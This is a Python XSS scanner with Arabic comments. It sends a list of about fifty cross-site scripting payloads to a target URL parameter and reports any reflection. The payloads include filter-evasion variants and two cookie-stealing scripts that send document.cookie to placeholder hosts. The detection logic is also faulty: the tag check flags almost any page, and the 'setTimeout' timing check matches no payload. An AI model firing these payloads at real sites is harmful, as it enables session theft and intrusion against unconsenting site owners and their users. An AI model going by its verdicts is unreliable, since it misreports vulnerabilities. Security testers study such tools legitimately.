import requests
import time

def scan_xss(url, param="input"):
    """
    يقوم بفحص الموقع لاكتشاف ثغرات XSS باستخدام طرق مختلفة، بما في ذلك الفحص المعتمد على الزمن.
    :param url: عنوان الموقع الذي تريد فحصه.
    :param param: اسم المعامل المراد حقنه (افتراضي: "input").
    """
    payloads = [
        "<script>alert(1)</script>",
        "'\"><script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<iframe src='javascript:alert(1)'></iframe>",
        "\"'><img src=x onerror=alert(1)>",
        "'><svg onload=alert(1)>",
        "<body onload=alert(1)>",
        "<details open ontoggle=alert(1)>",
        "<a href='javascript:alert(1)'>Click me</a>",
        "\"><script>",
        "<script>alert(\"ALMHEB\")</script>",
        "<<script>alert(\"ALMHEB\");//<</script>",
        "<script>alert(document.cookie)</script>",
        "'><script>alert(document.cookie)</script>",
        "'><script>alert(document.cookie);</script>",
        "\\\";alert('XSS');//",
        "%3cscript%3ealert(\"ALMHEB\");%3c/script%3e",
        "%3cscript%3ealert(document.cookie);%3c%2fscript%3e",
        "%3Cscript%3Ealert(%22X%20SS%22);%3C/script%3E",
        "&ltscript&gtalert(document.cookie);</script>",
        "&ltscript&gtalert(document.cookie);&ltscript&gtalert",
        "<xss><script>alert('ALMHEB')</script></vulnerable>",
        "<IMG%20SRC='javascript:alert(document.cookie)'>",
        "<IMG%20SRC=\"javascript:alert('ALMHEB');\">",
        "<IMG%20SRC=\"javascript:alert('ALMHEB')\"",
        "<IMG%20SRC=javascript:alert('ALMHEB')>",
        "<IMG%20SRC=JaVaScRiPt:alert('ALMHEB')>",
        "<IMG%20SRC=javascript:alert(&quot;ALMHEB&quot;)>",
        "<IMG%20SRC=`javascript:alert(\"'ALMHEB'\")`>",
        "<IMG%20\"\"\"><SCRIPT>alert(\"ALMHEB\")</SCRIPT>\">",
        "<IMG%20SRC=javascript:alert(String.fromCharCode(88,83,83))>",
        "<IMG%20SRC='javasc\\ript:alert(document.cookie)'>",
        "<IMG%20SRC=\"jav\\ascript:alert('ALMHEB');\">",
        "<IMG%20SRC=\"jav&#x09;ascript:alert('ALMHEB');\">",
        "<IMG%20SRC=\"jav&#x0A;ascript:alert('ALMHEB');\">",
        "<IMG%20SRC=\"jav&#x0D;ascript:alert('ALMHEB');\">",
        "<IMG%20SRC=\"%20&#14;%20javascript:alert('ALMHEB');\">",
        "<IMG%20DYNSRC=\"javascript:alert('ALMHEB')\">",
        "<IMG%20LOWSRC=\"javascript:alert('ALMHEB')\">",
        "<IMG%20SRC='%26%23x6a;avasc%26%23000010ript:a%26%23x6c;ert(document.%26%23x63;ookie)'>",
        "<IMG%20SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>",
        "<IMG%20SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>",
        "<IMG%20SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>",
        "'%3CIFRAME%20SRC=javascript:alert(%2527XSS%2527)%3E%3C/IFRAME%3E",
        "\"><script>document.location='http://cookieStealer/cgi-bin/cookie.cgi?'+document.cookie</script>",
        "%22%3E%3Cscript%3Edocument%2Elocation%3D%27http%3A%2F%2Fyour%2Esite%2Ecom%2Fcgi%2Dbin%2Fcookie%2Ecgi%3F%27%20%2Bdocument%2Ecookie%3C%2Fscript%3E",
        "';alert(String.fromCharCode(88,83,83))//\\';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//></SCRIPT>!--<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>=&{}",
        "'';!--\"<XSS>=&{()}"
    ]

    for payload in payloads:
        target_url = f"{url}?{param}={payload}"
        try:
            start_time = time.time()
            response = requests.get(target_url)
            response_time = time.time() - start_time

            if payload in response.text:
                print(f"[+] تم اكتشاف ثغرة XSS عند: {target_url}")
                return True
            
            elif any(tag in response.text.lower() for tag in ["<script>", "<img", "<svg", "<iframe", "<details", "<object", "<input", "<math", "<xss"]):
                print(f"[+] تم اكتشاف ثغرة XSS مع حمولة مخصصة عند: {target_url}")
                return True
            
            elif "setTimeout" in payload and response_time > 4:
                print(f"[+] تم اكتشاف ثغرة XSS تعتمد على الزمن عند: {target_url}")
                return True
            
        except requests.exceptions.RequestException as e:
            print(f"[!] خطأ أثناء الاتصال بـ {target_url}: {e}")

    
    return False
